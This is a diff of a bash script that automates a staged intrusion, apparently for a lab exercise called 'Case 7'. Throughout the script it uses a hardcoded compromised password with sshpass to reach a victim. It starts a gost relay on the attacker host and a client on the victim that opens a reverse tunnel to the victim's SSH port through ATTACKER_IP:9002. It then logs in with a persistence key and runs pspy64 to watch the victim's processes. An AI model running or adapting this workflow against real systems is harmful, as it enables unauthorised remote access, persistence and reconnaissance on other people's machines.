@@ -3,23 +3,17 @@
 set -euo pipefail
 
 # ================================================
-# Target user and paths
+# Case 7 paths
 # ================================================
 
-ATTACK_UID="1002"
-
-if ! ATTACK_PASSWD_ENTRY="$(getent passwd "${ATTACK_UID}")"; then
-  echo "ERROR: user with UID ${ATTACK_UID} not found" >&2
-  exit 1
-fi
-
-ATTACK_USER="$(echo "${ATTACK_PASSWD_ENTRY}" | cut -d: -f1)"
-ATTACK_HOME="$(echo "${ATTACK_PASSWD_ENTRY}" | cut -d: -f6)"
+ATTACK_HOME="/opt/case7"
 
 ROLE_FILE="${ATTACK_HOME}/lab_roles_ip.txt"
 LOCAL_GOST_PATH="${ATTACK_HOME}/gost"
 LOCAL_PSPY_PATH="${ATTACK_HOME}/pspy64"
-PERSIST_KEY="${ATTACK_HOME}/.ssh/case7_persistence_key"
+PERSIST_KEY="${ATTACK_HOME}/keys/case7_persistence_key"
+
+GOST_SERVER_LOG="${ATTACK_HOME}/gost-server.log"
 
 # ================================================
 # Compromised account
@@ -32,8 +26,8 @@ COMPROMISED_PASS="4d853d07751c05e2b915ea16c4170cf7"
 # Checks
 # ================================================
 
-if [[ -z "${ATTACK_HOME}" || ! -d "${ATTACK_HOME}" ]]; then
-  echo "ERROR: home directory not found for UID ${ATTACK_UID}: ${ATTACK_HOME}" >&2
+if [[ ! -d "${ATTACK_HOME}" ]]; then
+  echo "ERROR: attack directory not found: ${ATTACK_HOME}" >&2
   exit 1
 fi
 
@@ -84,12 +78,7 @@ fi
 # Local GOST relay on attacker
 # ================================================
 
-if [[ -f "${ATTACK_HOME}/gost-server.pid" ]] && kill -0 "$(cat "${ATTACK_HOME}/gost-server.pid")" 2>/dev/null; then
-  kill "$(cat "${ATTACK_HOME}/gost-server.pid")" 2>/dev/null || true
-  sleep 1
-fi
-
-sudo -u "${ATTACK_USER}" bash -c "nohup '${LOCAL_GOST_PATH}' -L 'relay://${ATTACKER_IP}:9002?bind=true' > '${ATTACK_HOME}/gost-server.log' 2>&1 & echo \$! > '${ATTACK_HOME}/gost-server.pid'"
+nohup "${LOCAL_GOST_PATH}" -L "relay://${ATTACKER_IP}:9002?bind=true" > "${GOST_SERVER_LOG}" 2>&1 &
 
 sleep 2
 
@@ -133,12 +122,7 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
 sshpass -p "${COMPROMISED_PASS}" ssh \
   -o StrictHostKeyChecking=accept-new \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  "if test -f ~/gost-client.pid; then kill \"\$(cat ~/gost-client.pid)\" 2>/dev/null || true; fi"
-
-sshpass -p "${COMPROMISED_PASS}" ssh \
-  -o StrictHostKeyChecking=accept-new \
-  "${COMPROMISED_USER}@${VICTIM_IP}" \
-  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 & echo \$! > ~/gost-client.pid"
+  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 &"
 
 sleep 3
 
@@ -197,13 +181,4 @@ ssh \
   -o PasswordAuthentication=no \
   -o StrictHostKeyChecking=accept-new \
   "${COMPROMISED_USER}@127.0.0.1" \
-  "if test -f ~/pspy.pid; then kill \"\$(cat ~/pspy.pid)\" 2>/dev/null || true; fi"
-
-ssh \
-  -i "${PERSIST_KEY}" \
-  -p 2223 \
-  -o BatchMode=yes \
-  -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
-  "${COMPROMISED_USER}@127.0.0.1" \
-  "nohup ~/.local/bin/pspy64 -pf -i 1000 > ~/pspy.log 2>&1 & echo \$! > ~/pspy.pid"
+  "nohup ~/.local/bin/pspy64 -pf -i 1000 > ~/pspy.log 2>&1 &"
